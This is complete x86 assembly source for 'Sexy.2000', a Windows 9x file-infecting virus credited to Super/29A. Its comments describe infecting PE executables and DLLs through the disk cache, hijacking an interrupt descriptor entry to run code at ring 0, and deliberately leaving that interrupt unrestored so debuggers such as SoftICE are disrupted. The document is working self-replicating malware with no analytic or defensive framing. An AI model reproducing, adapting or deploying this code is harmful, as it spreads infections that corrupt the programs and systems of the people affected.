   ;=================;
   ; Sexy.2000 virus ;
   ;=================;

   ;Coded by Super/29A

   ;VirusSize = 156 bytes !!!


   ;This virus infects all PE headers in the cache and returns control to
   ;host. It can even infect DLLs. Once a DLL is infected, its entrypoint
   ;will be called when executing a program that imports its APIs,  so it
   ;may expand very fast, even if its not memory resident.

   ;Some of the structures are undocumented
   ;I had to invent some names  :-)

   ;-------------------------------------------------------------------

    .386p
    .model flat,STDCALL

    extrn ExitProcess : near
    extrn MessageBoxA : near

   ;-------------------------------------------------------------------

   ;DEBUG = 1  ; uncomment this if u wanna to be able to trace it with softice

   VirusSize = (VirusEnd - VirusStart)

   IFDEF DEBUG
    interrupt = 5  ; use this interrupt in debug mode
   ELSE
    interrupt = 1  ; this makes tracing with softice a bit harder!
   ENDIF

   VCache      = 048Bh  ; ID of vcache.vxd
   VCache_Enum = 0009h  ; Service number

   VxDCall macro vxd_id,service_id
    int 20h
    dw service_id
    dw vxd_id
   endm

   ;-------------------------------------------------------------------

   .data

    db 'Ring0 is wonderful, isnt it?',0

   Title:
    db 'Sexy.2000 - Super/29A',0

   Text:
    db 'Win9x Cache Infector - '
    db '0' + (VirusSize/100) mod 10
    db '0' + (VirusSize/10) mod 10
    db '0' + (VirusSize/1) mod 10
    db ' bytes',0

   ;-------------------------------------------------------------------


   .code

   ;===================================================================

   VirusStart:



   ;This routine will be called for every cached page

   InfectCache:

     ; ESI = Cache Block structure
     ; EDX = offset VirusStart
     ; EBX = offset Ring0_Code

     IFDEF DEBUG
      int 3  ; only for debug mode!
     ENDIF

      fst qword ptr [ebx]  ; restore VxD dynamic call

      mov ecx,[esi+08h]  ; check if this cache is valid
      jecxz _ret

      mov edi,[esi+10h]

     IFDEF DEBUG
      cmp dword ptr [edi+300h],'TAOG'  ; only for debug mode!
      jnz _ret
      int 3
      nop
     ENDIF

      cmp byte ptr [edi],'M'  ; EDI = MZ header
      jnz _ret

      mov eax,0FFCh  ; mask limit to avoid crash!
      mov ecx,[edi+3Ch]
      and ecx,eax
      add ecx,edi

      cmp byte ptr [ecx],'P'  ; ESI = PE header
      jnz _ret

      and eax,[ecx+54h]  ; Size of Header

      sub [ecx+28h],eax

      lea eax,[eax-(VirusEnd-VirusEntryPoint)]

      lea edi,[edi+eax-(VirusEntryPoint-VirusStart)]

      xchg [ecx+28h],eax  ; set new EntryPoint

      jb _ret  ; already infected

      push ((VirusSize/4)-1)  ; last dword will be saved later
      pop ecx

      xchg esi,edx  ; ESI = start of virus
                    ; EDX = Cache Block

      rep movsd  ; copy virus to end of PE header

      stosd  ; fix jump to return control to host


      ; EDX = Infected Cache Block (which points to the page we have infected)


   ;Here we are gonna find the pointer to the pending cache writes

      mov ch,02h
      lea eax,[ecx-0Ch]  ; EAX=1F4h   ;-D
      mov edi,[edx+0Ch]  ; EDI = VRP (Volume Resource Pointer)
      repnz scasd
      jnz _ret  ; not found  :-(

      ; EDI = offset in VRP which contains PendingList pointer

      cmp byte ptr [edi+30h],ah  ; only infect logical drives C,D,...
      jbe _ret

      mov byte ptr [edx+32h],0FFh  ; set the dirty flag on this page


   ;Now we are gonna insert this cache in the pending cache writes


      mov ecx,[edi]  ; ECX = PendingList pointer (first cache in list)

      mov esi,edx  ; ESI will be PendingList->Next
      mov eax,edx  ; EAX will be PendingList->Previous

      jecxz FirstCache  ; we are inserting the first one!  ;-)

      xchg esi,[ecx+1Ch]  ; PendingList->Next = Infected Cache Block
                          ; ESI = PendingList->Next

      xchg eax,[esi+20h]  ; PendingList->Next->Previous = Infected Cache Block
                          ; EAX = PendingList->Next->Previous = ECX

   FirstCache:

      mov [edx+1Ch],esi  ; set PendingList->Next
      mov [edx+20h],eax  ; set PendingList->Previous

      stosd  ; set PendingList pointer

   _ret:

      ret

   ;-------------------------------------------------------------------

   Ring0_Code:

      VxDCall VCache,VCache_Enum  ; enumarate all caches for FSD_ID = AH
      iret

   ;-------------------------------------------------------------------

   VirusName db 'Sexy.2000'

   ;-------------------------------------------------------------------

   VirusEntryPoint:

     IFDEF DEBUG
      int 3
     ENDIF

      pop edi
      push edi
      inc edi

      jns JumpHost  ; return to host if its winNT

      pushad
      sidt fword ptr [esp-2]
      popad

      ; EDI = IDT Base Address

      lea ebx,[eax-(VirusEntryPoint-Ring0_Code)]

   ;This sets int1 to our ring0 code, but we dont restore int1
   ;This will fuck softice users! X-D

      mov [edi+(interrupt*8)],bx
      mov ah,0eeh
      mov [edi+(interrupt*8)+4],eax

      lea edx,[ebx-(Ring0_Code-InfectCache)]

      fld qword ptr [ebx]  ; remember vxd dynamic call, for later restoring it

   Next_FSD:

     IFDEF DEBUG
      int 5
     ELSE
      db 0F1h  ;-)
     ENDIF

      dec ah
      jnz Next_FSD  ; try next FSD!

   JumpHost:

      db 0E9h
      dd (HostEntryPoint-$-4)

     IFDEF DEBUG
      align 4  ; only for debug mode!
               ; I used it to be sure VirusSize is multiple of 4
     ENDIF


   VirusEnd:

   ;===================================================================

   HostEntryPoint proc near

    push 0
    push offset Title
    push offset Text
    push 0
    call MessageBoxA

    push 0
    call ExitProcess

   HostEntryPoint endp

   ;===================================================================

   ends
   end VirusEntryPoint
